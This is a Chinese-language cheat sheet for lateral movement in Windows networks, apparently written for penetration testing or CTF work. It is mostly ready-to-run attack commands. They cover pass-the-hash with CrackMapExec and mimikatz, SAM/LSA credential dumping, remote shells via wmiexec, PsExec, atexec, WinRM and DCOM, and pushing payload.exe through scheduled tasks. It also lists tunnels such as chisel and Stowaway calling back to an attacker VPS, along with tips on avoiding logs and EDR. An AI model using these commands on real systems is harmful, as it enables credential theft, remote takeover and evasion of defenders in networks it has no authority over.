# 内网横向移动技术速查

> 前提：已拿到内网一台主机权限，持有明文密码或NTLM Hash。
> 优先级：CrackMapExec批量 → WMI → PsExec → IPC+计划任务 → WinRM → DCOM。
> 经代理时所有impacket工具前加 `proxychains -q`。

---

## 1. CrackMapExec / NetExec（批量横向首选）

**条件**：445端口 + 明文或Hash

```bash
# 批量PTH验证（Pwn3d!表示可横向）
crackmapexec smb <SUBNET>/24 -u admin -H <NTLM_HASH>
crackmapexec smb <SUBNET>/24 -u admin -p 'Pass123'

# 命令执行
crackmapexec smb <TARGET_IP> -u admin -H <NTLM_HASH> -x "whoami"

# 抓Hash
crackmapexec smb <TARGET_IP> -u admin -H <NTLM_HASH> --sam
crackmapexec smb <TARGET_IP> -u admin -H <NTLM_HASH> --lsa
```

> netexec是crackmapexec的继任者，命令完全兼容，将cme替换为nxc即可。

---

## 2. WMI 横向（不落地文件，隐蔽性好）

**条件**：135端口 + 管理员凭据

```bash
# impacket wmiexec（交互式shell，推荐）
wmiexec.py DOMAIN/admin:Pass123@<TARGET_IP>
wmiexec.py DOMAIN/admin@<TARGET_IP> -hashes :<NTLM_HASH>

# wmic原生（无回显，仅Windows）
wmic /node:<TARGET_IP> /user:DOMAIN\admin /password:Pass123 process call create "cmd /c whoami > C:\r.txt"
```

---

## 3. PsExec 横向（稳定，痕迹明显）

**条件**：admin$共享 + 445端口 + 管理员凭据
**痕迹**：服务创建日志 EventID 7045，杀软可能拦截

```bash
# Sysinternals版
psexec \\<TARGET_IP> -u DOMAIN\admin -p Pass123 -s -accepteula cmd

# impacket版（推荐，无需上传exe）
impacket-psexec DOMAIN/admin:Pass123@<TARGET_IP>
impacket-psexec DOMAIN/admin@<TARGET_IP> -hashes :<NTLM_HASH>
impacket-smbexec DOMAIN/admin:Pass123@<TARGET_IP>
```

---

## 4. PTH 哈希传递（mimikatz）

**条件**：NTLM Hash + 445/135端口
**场景**：在Windows上直接用mimikatz弹认证窗口，再接其他工具

```
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:<NTLM_HASH>"
```

> 弹出新CMD窗口，该窗口内net use/psexec等自动携带凭据。工作组仅对同密码机器有效。

---

## 5. IPC$ + 计划任务 / atexec

**条件**：139/445端口 + 凭据 + 默认共享开启

```bash
# IPC连接 + 文件操作
net use \\<TARGET_IP> /u:DOMAIN\admin Pass123
copy payload.exe \\<TARGET_IP>\c$\windows\temp\
type \\<TARGET_IP>\c$\flag.txt

# schtasks执行（Win2008+）
schtasks /create /s <TARGET_IP> /tn t1 /tr "c:\windows\temp\payload.exe" /sc once /st 00:00 /ru system
schtasks /run /s <TARGET_IP> /tn t1
schtasks /delete /s <TARGET_IP> /tn t1 /f

# atexec.py（impacket，更简洁，自动清理）
atexec.py DOMAIN/admin:Pass123@<TARGET_IP> "whoami"
atexec.py DOMAIN/admin@<TARGET_IP> -hashes :<NTLM_HASH> "type c:\flag.txt"

# 断开
net use \\<TARGET_IP> /del /y
```

---

## 6. WinRM 横向（Win2012+默认开启）

**条件**：5985(HTTP)/5986(HTTPS) + 管理员凭据

```bash
# winrs（Windows原生）
winrs -r:<TARGET_IP> -u:admin -p:Pass123 "whoami"
winrs -r:<TARGET_IP> -u:admin -p:Pass123 "cmd"

# evil-winrm（Kali，支持Hash/上传下载/内存加载）
evil-winrm -i <TARGET_IP> -u admin -p Pass123
evil-winrm -i <TARGET_IP> -u admin -H <NTLM_HASH>
```

---

## 7. DCOM 横向（高隐蔽，EDR盲区）

**条件**：管理员 + 135+随机高端口

```powershell
# MMC20.Application
$com=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<TARGET_IP>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <CMD>","7")

# impacket
dcomexec.py DOMAIN/admin:Pass123@<TARGET_IP>
dcomexec.py DOMAIN/admin@<TARGET_IP> -hashes :<NTLM_HASH>
```

---

## 8. 隧道工具速查

| 工具 | 场景 | 命令 |
|------|------|------|
| **frp** | socks5代理 | `frps -c frps.toml` / `frpc -c frpc.toml`（plugin=socks5） |
| **chisel** | 全TCP隧道 | `chisel server -p 9000 --socks5` + `chisel client VPS:9000 socks` |
| **iox** | 端口转发 | `iox fwd -l 8888 -r TARGET:3389` / `iox proxy -r VPS:9999` |
| **suo5** | HTTP隧道 | 上传suo5.aspx → `suo5 -t http://TARGET/suo5.aspx -l :1111` |
| **Stowaway** | 多级级联 | `admin -l 9999 -s KEY` / `agent -c VPS:9999 -s KEY` |
| **pingtunnel** | ICMP隧道 | `pingtunnel -type server` / `pingtunnel -type client -s VPS -sock5 1 -l :4455` |
